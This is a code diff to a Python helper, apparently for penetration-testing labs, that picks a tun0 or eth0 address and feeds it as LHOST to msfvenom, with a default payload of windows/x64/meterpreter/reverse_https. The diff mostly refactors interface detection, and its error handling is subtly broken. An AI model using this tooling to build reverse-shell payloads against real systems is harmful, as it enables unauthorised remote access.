@@ -7,13 +7,25 @@ import os
 
 def get_tun0_ip():
     try:
-        result = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True, check=True)
+        tun0 = subprocess.run(['ip', 'addr', 'show', 'tun0'], capture_output=True, text=True, check=True)
+        eth0 = subprocess.run(['ip', 'addr', 'show', 'eth0'], capture_output=True, text=True, check=True)
     except subprocess.CalledProcessError as e:
-        try:
-            result = subprocess.run(['ip', 'addr', 'show', 'eth0'], capture_output=True, text=True, check=True)
-        except subprocess.CalledProcessError as e:
-            print(f"No eth0 or tun0 found. Giving default IP of 192.168.1.1: {e}")
+        print("error with ip addr command.")
+    tunIP = getIP(tun0)
+    ethIP = getIP(eth0)
+    if tunIP == None:
+        if ethIP == None:
+            print("No interface found returning 192.168.1.1")
             return "192.168.1.1"
+        else:
+            print("eth0 selected")
+            return ethIP
+    else:
+        print("tun0 selected")
+        return tunIP
+
+    
+def getIP(result):
     output_lines = result.stdout.splitlines()
     for line in output_lines:
         if 'inet' in line:
@@ -27,7 +39,7 @@ def Call_Msfvenom(plFormat):
     payload = input("Enter msfvenom payload. Default value is [windows/x64/meterpreter/reverse_https]")
     if payload == "":
         payload = "windows/x64/meterpreter/reverse_https"
-    print("Getting tun0 interface to default to.")
+    print("Getting interface to default to.")
     defaulthost = get_tun0_ip()
     lhost = input(f"Enter msfvenom lhost. I grabbed the an ip (tun0 or eth0), default with that is [{defaulthost}]")
     if lhost == "":
